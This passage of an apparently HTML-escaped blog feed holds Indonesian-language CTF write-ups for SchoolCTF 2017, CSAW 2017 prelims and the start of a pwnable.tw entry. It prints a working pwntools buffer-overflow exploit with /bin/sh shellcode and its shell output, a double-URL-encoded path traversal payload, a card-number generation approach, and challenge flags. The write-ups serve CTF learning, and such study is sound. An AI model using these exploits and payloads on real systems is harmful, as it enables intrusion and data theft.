            &lt;span style=&quot;color:#e28964;&quot;&gt;return&lt;/span&gt; char
        &lt;span style=&quot;color:#e28964;&quot;&gt;else&lt;/span&gt;:
            &lt;span style=&quot;color:#e28964;&quot;&gt;continue&lt;/span&gt;    
&lt;span style=&quot;color:#99cf50;&quot;&gt;def&lt;/span&gt; &lt;span style=&quot;color:#89bdff;&quot;&gt;main&lt;/span&gt;():
    &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# p1,p3,p5, and p6 obtained from :&lt;/span&gt;
    &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# http://hashkiller.co.uk&lt;/span&gt;
    &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# https://md5hashing.net/&lt;/span&gt;
    p1 &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;541&quot;&lt;/span&gt;
    p2 &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;____&quot;&lt;/span&gt;
    p3 &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;&quot;&lt;/span&gt;
    p4 &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;&quot;&lt;/span&gt;
    p5 &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;19&quot;&lt;/span&gt;
    p6 &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;757&quot;&lt;/span&gt;
    p7 &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;&quot;&lt;/span&gt;
    p8 &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;&quot;&lt;/span&gt;
    p3 &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; text3()
    p4 &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; text4()
    p7 &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; text7()
    p8 &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; text8()
    &lt;span style=&quot;color:#e28964;&quot;&gt;print&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;&quot;Flag : SchoolCTF{&quot;&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;p8[&lt;span style=&quot;color:#3387cc;&quot;&gt;1&lt;/span&gt;]&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt; p8[&lt;span style=&quot;color:#3387cc;&quot;&gt;0&lt;/span&gt;]&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt; p6[&lt;span style=&quot;color:#3387cc;&quot;&gt;1&lt;/span&gt;]&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt; p6[&lt;span style=&quot;color:#3387cc;&quot;&gt;0&lt;/span&gt;]&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt; p2[&lt;span style=&quot;color:#3387cc;&quot;&gt;3&lt;/span&gt;]&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt; p7[&lt;span style=&quot;color:#3387cc;&quot;&gt;1&lt;/span&gt;]&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt; p1[&lt;span style=&quot;color:#3387cc;&quot;&gt;1&lt;/span&gt;]&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt; p1[&lt;span style=&quot;color:#3387cc;&quot;&gt;0&lt;/span&gt;]&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt; p7[&lt;span style=&quot;color:#3387cc;&quot;&gt;0&lt;/span&gt;]&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt; p2[&lt;span style=&quot;color:#3387cc;&quot;&gt;1&lt;/span&gt;]&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;  p1[&lt;span style=&quot;color:#3387cc;&quot;&gt;2&lt;/span&gt;]&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;  p6[&lt;span style=&quot;color:#3387cc;&quot;&gt;2&lt;/span&gt;]&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;  p2[&lt;span style=&quot;color:#3387cc;&quot;&gt;2&lt;/span&gt;]&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;  p3[&lt;span style=&quot;color:#3387cc;&quot;&gt;0&lt;/span&gt;]&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;  &lt;span style=&quot;color:#65b042;&quot;&gt;'y'&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;  p2[&lt;span style=&quot;color:#3387cc;&quot;&gt;0&lt;/span&gt;]&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;  p3[&lt;span style=&quot;color:#3387cc;&quot;&gt;1&lt;/span&gt;]&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;  p3[&lt;span style=&quot;color:#3387cc;&quot;&gt;2&lt;/span&gt;]&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;  &lt;span style=&quot;color:#65b042;&quot;&gt;'r'&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;  p4[&lt;span style=&quot;color:#3387cc;&quot;&gt;0&lt;/span&gt;]&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;  p5[&lt;span style=&quot;color:#3387cc;&quot;&gt;0&lt;/span&gt;]&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;  &lt;span style=&quot;color:#65b042;&quot;&gt;'n'&lt;/span&gt;&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;  p5[&lt;span style=&quot;color:#3387cc;&quot;&gt;1&lt;/span&gt;]&lt;span style=&quot;color:#e28964;&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;color:#65b042;&quot;&gt;&quot;}&quot;&lt;/span&gt;
&lt;span style=&quot;color:#e28964;&quot;&gt;if&lt;/span&gt; &lt;span style=&quot;color:#9b859d;&quot;&gt;__name__&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;==&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;'__main__'&lt;/span&gt;:
    main()
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Flag : SchoolCTF{Ju57_h45h_17_my_d4rl1n9}&lt;/strong&gt;&lt;/p&gt;
</description>
        <pubDate>Wed, 15 Nov 2017 00:00:00 +0700</pubDate>
        <link>https://rhama.my.id/ctf/2017/11/15/school-ctf-2017.html</link>
        <guid isPermaLink="true">https://rhama.my.id/ctf/2017/11/15/school-ctf-2017.html</guid>
        
        <category>schoolctf-2017</category>
        
        <category>CTF</category>
        
        
        <category>CTF</category>
        
      </item>
    
      <item>
        <title>CSAW CTF 2017 Prelims Write Up</title>
        <description>&lt;h1&gt;Pwn (75) - Pilot&lt;/h1&gt;
&lt;pre style=&quot;background:#0d0d0d;color:#dde6cf;&quot;&gt;pilot
Can I take your order?
nc pwn.chal.csaw.io 8464
&lt;/pre&gt;
&lt;p&gt;Diberikan sebuah binary 64 bit striped.&lt;/p&gt;
&lt;pre style=&quot;background:#002240;color:#fff;&quot;&gt;dev@Pwning:&lt;span style=&quot;color:#ff9d00;&quot;&gt;~&lt;/span&gt;/CTF/CSAW2017$ file pilot
pilot: ELF 64-bit LSB executable, x86-64, version 1 &lt;span style=&quot;color:#e1efff;&quot;&gt;(&lt;/span&gt;SYSV&lt;span style=&quot;color:#e1efff;&quot;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, &lt;span style=&quot;color:#ff9d00;&quot;&gt;for&lt;/span&gt; &lt;span style=&quot;color:#ccc;&quot;&gt;GNU/Linux&lt;/span&gt; 2.6.32, BuildID[sha1]=6ed26a43b94fd3ff1dd15964e4106df72c01dc6c, stripped
&lt;/pre&gt;
&lt;p&gt;Apabila program dijalankan akan meminta command yang merupakan inputan pengguna.&lt;/p&gt;
&lt;pre style=&quot;background:#002240;color:#fff;&quot;&gt;dev@Pwning:&lt;span style=&quot;color:#ff9d00;&quot;&gt;~&lt;/span&gt;/CTF/CSAW2017$ ./pilot
[&lt;span style=&quot;color:#ff9d00;&quot;&gt;*&lt;/span&gt;]Welcome DropShip Pilot...
[&lt;span style=&quot;color:#ff9d00;&quot;&gt;*&lt;/span&gt;]I am your assitant A.I....
[&lt;span style=&quot;color:#ff9d00;&quot;&gt;*&lt;/span&gt;]I will be guiding you through the tutorial....
[&lt;span style=&quot;color:#ff9d00;&quot;&gt;*&lt;/span&gt;]As a first step, lets learn how to land at the designated location....
[&lt;span style=&quot;color:#ff9d00;&quot;&gt;*&lt;/span&gt;]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines &lt;span style=&quot;color:#ff9d00;&quot;&gt;&amp;amp;&lt;/span&gt; Medics...
[&lt;span style=&quot;color:#ff9d00;&quot;&gt;*&lt;/span&gt;]Good Luck Pilot&lt;span style=&quot;color:#ff9d00;&quot;&gt;!&lt;/span&gt;....
[&lt;span style=&quot;color:#ff9d00;&quot;&gt;*&lt;/span&gt;]Location:0x7fff7a453100
[&lt;span style=&quot;color:#ff9d00;&quot;&gt;*&lt;/span&gt;]Command:
&lt;/pre&gt;
&lt;p&gt;Dimana setelah dilakukan debugging menggunakan &lt;em&gt;&lt;strong&gt;GDB&lt;/strong&gt;&lt;/em&gt;, program tersebut vulnerable terhadap &lt;em&gt;&lt;strong&gt;Buffer Overflow&lt;/strong&gt;&lt;/em&gt; terlihat pada fungsi &lt;em&gt;&lt;strong&gt;read()&lt;/strong&gt;&lt;/em&gt; membaca 0x40 ( 64) bytes inputan pengguna yang seperti nya melebihi buffer size variable penampung yang terletak di rbp-0x20.&lt;/p&gt;
&lt;pre style=&quot;background:#002240;color:#fff;&quot;&gt;   &lt;span style=&quot;color:#ff628c;&quot;&gt;0x0000000000400acf&lt;/span&gt;:  lea    rax,&lt;span style=&quot;color:#e1efff;&quot;&gt;[&lt;/span&gt;rbp&lt;span style=&quot;color:#ff9d00;&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;color:#ff628c;&quot;&gt;0x20&lt;/span&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;]&lt;/span&gt;
   &lt;span style=&quot;color:#ff628c;&quot;&gt;0x0000000000400ad3&lt;/span&gt;:  mov    edx,&lt;span style=&quot;color:#ff628c;&quot;&gt;0x40&lt;/span&gt;
   &lt;span style=&quot;color:#ff628c;&quot;&gt;0x0000000000400ad8&lt;/span&gt;:  mov    rsi,rax
   &lt;span style=&quot;color:#ff628c;&quot;&gt;0x0000000000400adb&lt;/span&gt;:  mov    edi,&lt;span style=&quot;color:#ff628c;&quot;&gt;0x0&lt;/span&gt;
   &lt;span style=&quot;color:#ff628c;&quot;&gt;0x0000000000400ae0&lt;/span&gt;:  call   &lt;span style=&quot;color:#ff628c;&quot;&gt;0x400820&lt;/span&gt; &lt;span style=&quot;color:#ff9d00;&quot;&gt;&amp;lt;&lt;/span&gt;read@plt&lt;span style=&quot;color:#ff9d00;&quot;&gt;&amp;gt;&lt;/span&gt;

&lt;/pre&gt;
&lt;p&gt;Didapatkan &lt;strong&gt;&lt;em&gt;Location&lt;/em&gt;&lt;/strong&gt; merupakan alamat stack dimana inputan penggunana akan disimpan dan dibutuhkan 40 bytes untuk meng &lt;em&gt;overwrite&lt;/em&gt; register RIP.&lt;/p&gt;
&lt;pre style=&quot;background:#002240;color:#fff;&quot;&gt;gdb&lt;span style=&quot;color:#ff9d00;&quot;&gt;-&lt;/span&gt;peda$ x&lt;span style=&quot;color:#ff9d00;&quot;&gt;/&lt;/span&gt;s &lt;span style=&quot;color:#ff628c;&quot;&gt;0x7fffffffe210&lt;/span&gt;
&lt;span style=&quot;color:#ff628c;&quot;&gt;0x7fffffffe210&lt;/span&gt;: &lt;span style=&quot;color:#3ad900;&quot;&gt;'&lt;/span&gt;A&lt;span style=&quot;color:#3ad900;&quot;&gt;'&lt;/span&gt; &lt;span style=&quot;color:#ff9d00;&quot;&gt;&amp;lt;&lt;/span&gt;repeats &lt;span style=&quot;color:#ff628c;&quot;&gt;40&lt;/span&gt; times&lt;span style=&quot;color:#ff9d00;&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Berikut exploit code yang digunakan&lt;/p&gt;
&lt;pre style=&quot;background:#002240;color:#fff;&quot;&gt;&lt;span style=&quot;color:#ff9d00;&quot;&gt;from&lt;/span&gt; pwn &lt;span style=&quot;color:#ff9d00;&quot;&gt;import&lt;/span&gt; &lt;span style=&quot;color:#ff9d00;&quot;&gt;*&lt;/span&gt;

&lt;span style=&quot;color:#08f;font-style:italic;&quot;&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;#&lt;/span&gt;r = process(&quot;./true&quot;)&lt;/span&gt;
r &lt;span style=&quot;color:#ff9d00;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#ffee80;&quot;&gt;remote&lt;span style=&quot;color:#e1efff;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color:#ffee80;&quot;&gt;&lt;span style=&quot;color:#3ad900;&quot;&gt;&quot;&lt;/span&gt;pwn.chal.csaw.io&lt;span style=&quot;color:#3ad900;&quot;&gt;&quot;&lt;/span&gt;, &lt;span style=&quot;color:#ff628c;&quot;&gt;8464&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span style=&quot;color:#ffee80;&quot;&gt;r.recvuntil&lt;span style=&quot;color:#e1efff;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color:#ffee80;&quot;&gt;&lt;span style=&quot;color:#3ad900;&quot;&gt;&quot;&lt;/span&gt;Location:&lt;span style=&quot;color:#3ad900;&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;)&lt;/span&gt;&lt;/span&gt;

shellcode &lt;span style=&quot;color:#ff9d00;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#3ad900;&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;color:#80ff82;&quot;&gt;\x48&lt;/span&gt;&lt;span style=&quot;color:#80ff82;&quot;&gt;\x31&lt;/span&gt;\xff&lt;span style=&quot;color:#80ff82;&quot;&gt;\x48&lt;/span&gt;&lt;span style=&quot;color:#80ff82;&quot;&gt;\x31&lt;/span&gt;\xf6&lt;span style=&quot;color:#80ff82;&quot;&gt;\x48&lt;/span&gt;&lt;span style=&quot;color:#80ff82;&quot;&gt;\x31&lt;/span&gt;\xd2&lt;span style=&quot;color:#80ff82;&quot;&gt;\x48&lt;/span&gt;&lt;span style=&quot;color:#80ff82;&quot;&gt;\x31&lt;/span&gt;\xc0&lt;span style=&quot;color:#80ff82;&quot;&gt;\x50&lt;/span&gt;&lt;span style=&quot;color:#80ff82;&quot;&gt;\x48&lt;/span&gt;\xbb\x2f&lt;span style=&quot;color:#80ff82;&quot;&gt;\x62&lt;/span&gt;&lt;span style=&quot;color:#80ff82;&quot;&gt;\x69&lt;/span&gt;\x6e\x2f\x2f&lt;span style=&quot;color:#80ff82;&quot;&gt;\x73&lt;/span&gt;&lt;span style=&quot;color:#80ff82;&quot;&gt;\x68&lt;/span&gt;&lt;span style=&quot;color:#80ff82;&quot;&gt;\x53&lt;/span&gt;&lt;span style=&quot;color:#80ff82;&quot;&gt;\x48&lt;/span&gt;&lt;span style=&quot;color:#80ff82;&quot;&gt;\x89&lt;/span&gt;\xe7\xb0\x3b\x0f&lt;span style=&quot;color:#80ff82;&quot;&gt;\x05&lt;/span&gt;&lt;span style=&quot;color:#3ad900;&quot;&gt;&quot;&lt;/span&gt;
payload &lt;span style=&quot;color:#ff9d00;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#3ad900;&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;color:#80ff82;&quot;&gt;\x90&lt;/span&gt;&lt;span style=&quot;color:#3ad900;&quot;&gt;&quot;&lt;/span&gt; &lt;span style=&quot;color:#ff9d00;&quot;&gt;*&lt;/span&gt; (&lt;span style=&quot;color:#ff628c;&quot;&gt;40&lt;/span&gt; &lt;span style=&quot;color:#ff9d00;&quot;&gt;-&lt;/span&gt; &lt;span style=&quot;color:#ffee80;&quot;&gt;&lt;span style=&quot;color:#ffb054;&quot;&gt;len&lt;/span&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color:#ffee80;&quot;&gt;shellcode&lt;/span&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;)&lt;/span&gt;&lt;/span&gt;)
payload &lt;span style=&quot;color:#ff9d00;&quot;&gt;=&lt;/span&gt; shellcode &lt;span style=&quot;color:#ff9d00;&quot;&gt;+&lt;/span&gt; payload

addr &lt;span style=&quot;color:#ff9d00;&quot;&gt;=&lt;/span&gt;  &lt;span style=&quot;color:#ffee80;&quot;&gt;&lt;span style=&quot;color:#80ffbb;&quot;&gt;int&lt;/span&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color:#ffee80;&quot;&gt;&lt;span style=&quot;color:#ffee80;&quot;&gt;r.recv&lt;span style=&quot;color:#e1efff;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color:#ffee80;&quot;&gt;&lt;span style=&quot;color:#ff628c;&quot;&gt;14&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;)&lt;/span&gt;&lt;/span&gt;,&lt;span style=&quot;color:#ff628c;&quot;&gt;16&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
addr &lt;span style=&quot;color:#ff9d00;&quot;&gt;=&lt;/span&gt;  &lt;span style=&quot;color:#ffee80;&quot;&gt;p64&lt;span style=&quot;color:#e1efff;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color:#ffee80;&quot;&gt;addr&lt;/span&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
payload_to_send &lt;span style=&quot;color:#ff9d00;&quot;&gt;=&lt;/span&gt; payload&lt;span style=&quot;color:#ff9d00;&quot;&gt;+&lt;/span&gt;addr

&lt;span style=&quot;color:#ffee80;&quot;&gt;log.info&lt;span style=&quot;color:#e1efff;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color:#ffee80;&quot;&gt;&lt;span style=&quot;color:#3ad900;&quot;&gt;&quot;&lt;/span&gt;Payload Length &lt;span style=&quot;color:#80ff82;&quot;&gt;%d&lt;/span&gt;&lt;span style=&quot;color:#3ad900;&quot;&gt;&quot;&lt;/span&gt; &lt;span style=&quot;color:#ff9d00;&quot;&gt;%&lt;/span&gt; (&lt;span style=&quot;color:#ffee80;&quot;&gt;&lt;span style=&quot;color:#ffb054;&quot;&gt;len&lt;/span&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color:#ffee80;&quot;&gt;payload_to_send&lt;/span&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;)&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span style=&quot;color:#ffee80;&quot;&gt;r.sendlineafter&lt;span style=&quot;color:#e1efff;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color:#ffee80;&quot;&gt;&lt;span style=&quot;color:#3ad900;&quot;&gt;&quot;&lt;/span&gt;Command:&lt;span style=&quot;color:#3ad900;&quot;&gt;&quot;&lt;/span&gt;,payload_to_send&lt;/span&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span style=&quot;color:#ffee80;&quot;&gt;r.interactive&lt;span style=&quot;color:#e1efff;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;)&lt;/span&gt;&lt;/span&gt;

&lt;/pre&gt;
&lt;p&gt;Exploit code dijalankan.&lt;/p&gt;
&lt;pre style=&quot;background:#002240;color:#fff;&quot;&gt;dev@Pwning:&lt;span style=&quot;color:#ff9d00;&quot;&gt;~&lt;/span&gt;&lt;span style=&quot;color:#ff9d00;&quot;&gt;/&lt;/span&gt;CTF&lt;span style=&quot;color:#ff9d00;&quot;&gt;/&lt;/span&gt;CSAW2017$ python pwn_pilot.py
&lt;span style=&quot;color:#e1efff;&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;color:#ff9d00;&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;]&lt;/span&gt; Opening connection to pwn.chal.csaw.io on port &lt;span style=&quot;color:#ff628c;&quot;&gt;8464&lt;/span&gt;: Done
&lt;span style=&quot;color:#e1efff;&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;color:#ff9d00;&quot;&gt;*&lt;/span&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;]&lt;/span&gt; Payload Length &lt;span style=&quot;color:#ff628c;&quot;&gt;48&lt;/span&gt;
&lt;span style=&quot;color:#e1efff;&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;color:#ff9d00;&quot;&gt;*&lt;/span&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;]&lt;/span&gt; Switching to interactive mode
$ ls
flag
pilot
$ cat flag
flag&lt;span style=&quot;color:#e1efff;&quot;&gt;{&lt;/span&gt;&lt;span style=&quot;color:#ff628c;&quot;&gt;1&lt;/span&gt;nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys&lt;span style=&quot;color:#e1efff;&quot;&gt;}&lt;/span&gt;
&lt;span style=&quot;color:#e1efff;&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;color:#ff9d00;&quot;&gt;*&lt;/span&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;]&lt;/span&gt; Got EOF &lt;span style=&quot;color:#ff9d00;&quot;&gt;while&lt;/span&gt; reading &lt;span style=&quot;color:#ff9d00;&quot;&gt;in&lt;/span&gt; interactive

&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Flag : flag{1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys}&lt;/strong&gt;&lt;/p&gt;
&lt;h1&gt;Misc (100) - CVV&lt;/h1&gt;
&lt;pre style=&quot;background:#181818;color:#f8f8f8;&quot;&gt;CVV
Hey fam, you got CVV? I need some CVV!
nc misc.chal.csaw.io &lt;span style=&quot;color:#cf6a4c;&quot;&gt;8308&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Pada challenge misc CVV terdiri dari 5 stages, yang dimana setiap stage harus dilewati agar bisa mendapatkan Flag.&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Stage 1 : meminta input nomor kartu kredit {Visa&lt;/td&gt;
      &lt;td&gt;Discover&lt;/td&gt;
      &lt;td&gt;American Express&lt;/td&gt;
      &lt;td&gt;MasterCard}&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Stage 2 : meminta input nomor kartu kredit dengan 4 digit prefix&lt;/p&gt;

&lt;p&gt;Stage 3 : meminta input nomor kartu kredit dengan 1 digit suffix&lt;/p&gt;

&lt;p&gt;Stage 4 : meminta input nomor kartu kredit dengan 4 digit suffix&lt;/p&gt;

&lt;p&gt;Stage 5 : meminta input apakah kartu kredit valid atau invalid.&lt;/p&gt;

&lt;p&gt;Untuk melewati stage 1, bisa menggunakan list kartu kredit yang didapatkan di situs http://www.getcreditcardnumbers.com/&lt;/p&gt;

&lt;p&gt;Untuk melewati stage 2-4, bisa menggunakan script &lt;a href=&quot;https://github.com/grahamking/darkcoding-credit-card/blob/master/gencc.py&quot;&gt;gencc.py&lt;/a&gt; (yang sudah saya ubah seperlu nya)&lt;/p&gt;

&lt;p&gt;Untuk melewati stage 5, bisa menggunakan algoritma Luhn&lt;/p&gt;

&lt;p&gt;Script yang saya gunakan bisa didapatkan disini : &lt;a href=&quot;https://github.com/rhamaa/CTF-Writeup/blob/master/CSAW2017_misc_cvv.py&quot;&gt;CSAW2017_misc_cvv.py&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Setelah dijalankan akan mendapatkan flag&lt;/p&gt;
&lt;pre style=&quot;background:#002240;color:#fff;&quot;&gt;dev@Pwning:&lt;span style=&quot;color:#ff9d00;&quot;&gt;~&lt;/span&gt;&lt;span style=&quot;color:#ff9d00;&quot;&gt;/&lt;/span&gt;CTF&lt;span style=&quot;color:#ff9d00;&quot;&gt;/&lt;/span&gt;CSAW2017$ python CSAW2017_misc_cvv.py
&lt;span style=&quot;color:#e1efff;&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;color:#ff9d00;&quot;&gt;+&lt;/span&gt;&lt;span style=&quot;color:#e1efff;&quot;&gt;]&lt;/span&gt; Opening connection to misc.chal.csaw.io on port &lt;span style=&quot;color:#ff628c;&quot;&gt;8308&lt;/span&gt;: Done
&lt;span style=&quot;color:#e1efff;&quot;&gt;[&lt;/span&gt;Send&lt;span style=&quot;color:#e1efff;&quot;&gt;]&lt;/span&gt; : &lt;span style=&quot;color:#ff628c;&quot;&gt;5323559891377255&lt;/span&gt;
&lt;span style=&quot;color:#e1efff;&quot;&gt;[&lt;/span&gt;Send&lt;span style=&quot;color:#e1efff;&quot;&gt;]&lt;/span&gt; : &lt;span style=&quot;color:#ff628c;&quot;&gt;347542481999772&lt;/span&gt;
&lt;span style=&quot;color:#e1efff;&quot;&gt;[&lt;/span&gt;Send&lt;span style=&quot;color:#e1efff;&quot;&gt;]&lt;/span&gt; : &lt;span style=&quot;color:#ff628c;&quot;&gt;6011857007915587&lt;/span&gt;
.......
Flag flag{ch3ck-exp3rian-dat3-b3for3-us3}
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Flag : flag{ch3ck-exp3rian-dat3-b3for3-us3}&lt;/strong&gt;&lt;/p&gt;
&lt;h1&gt;Web (100) - Orange1&lt;/h1&gt;
&lt;pre style=&quot;background:#0c1021;color:#f8f8f8;&quot;&gt;orange v1

I wrote a little proxy program &lt;span style=&quot;color:#fbde2d;&quot;&gt;in&lt;/span&gt; NodeJS &lt;span style=&quot;color:#fbde2d;&quot;&gt;for&lt;/span&gt; my poems folder.

Everyone wants to read flag.txt but I like it too much to share.

http:&lt;span style=&quot;color:#fbde2d;&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;color:#fbde2d;&quot;&gt;/&lt;/span&gt;web.chal.csaw.io:&lt;span style=&quot;color:#d8fa3c;&quot;&gt;7311&lt;/span&gt;&lt;span style=&quot;color:#fbde2d;&quot;&gt;/&lt;/span&gt;?path&lt;span style=&quot;color:#fbde2d;&quot;&gt;=&lt;/span&gt;orange.txt

&lt;/pre&gt;
&lt;p&gt;Saat mencoba mengakses web http://web.chal.csaw.io:7311/?path=orange.txt akan membaca file orange.txt&lt;/p&gt;

&lt;p&gt;Apabila dilakukan &lt;em&gt;&lt;strong&gt;Path Traversing&lt;/strong&gt;&lt;/em&gt; ( ../ ) akan mengeluarkan pesan &lt;strong&gt;&lt;em&gt;WHOA THATS BANNED!!!!&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Percobaan bypass menggunakan &lt;em&gt;&lt;strong&gt;Double Urlencoding&lt;/strong&gt;&lt;/em&gt; ternyata berhasil bisa membaca file flag.txt&lt;/p&gt;

&lt;p&gt;../ =&amp;gt; %252E%252E%252F&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://web.chal.csaw.io:7311/?path=%252E%252E%252Fflag.txt&quot;&gt;http://web.chal.csaw.io:7311/?path=%252E%252E%252Fflag.txt&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Flag : flag{thank_you_based_orange_for_this_ctf_challenge}&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Special Thanks to Allah SWT, lalu kemudian bang Abdilahrf yang udh bantu fix script CVV.&lt;/p&gt;

&lt;p&gt;RulesOfPwning - rhama, ramdhan, bayu, Niko, Riorden, Amrul dan Agus&lt;/p&gt;
</description>
        <pubDate>Tue, 14 Nov 2017 00:00:00 +0700</pubDate>
        <link>https://rhama.my.id/ctf/2017/11/14/csawctf-2017-quals.html</link>
        <guid isPermaLink="true">https://rhama.my.id/ctf/2017/11/14/csawctf-2017-quals.html</guid>
        
        <category>csawctf-2017-quals</category>
        
        <category>CTF</category>
        
        
        <category>CTF</category>
        
      </item>
    
      <item>
        <title>Pwnable.tw - Start (100)</title>
        <description>&lt;p&gt;Diberikan sebuah binary bernama start, yang vulnerable buffer overflow, karena buffer inputan lebih besar dari buffer variable penampung.&lt;/p&gt;

&lt;p&gt;Berikut informasi binary start.&lt;/p&gt;
&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;$ &lt;span style=&quot;color:#9b859d;&quot;&gt;file&lt;/span&gt; start                                                                                                                      
